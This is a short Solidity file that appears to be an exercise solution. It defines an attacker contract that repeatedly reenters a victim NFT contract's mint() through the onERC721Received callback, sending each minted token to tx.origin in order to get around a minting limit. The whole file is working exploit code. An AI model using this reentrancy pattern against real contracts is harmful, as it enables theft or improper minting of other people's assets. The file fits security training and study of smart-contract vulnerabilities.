// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "../Overmint3.sol";

contract Overmint3Attacker is IERC721Receiver {
    constructor(Overmint3 _victim) {
        _victim.mint();
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        returns (bytes4)
    {
        Overmint3(msg.sender).transferFrom(address(this), tx.origin, Overmint3(msg.sender).totalSupply());
        Overmint3(msg.sender).mint();

        return IERC721Receiver.onERC721Received.selector;
    }
}
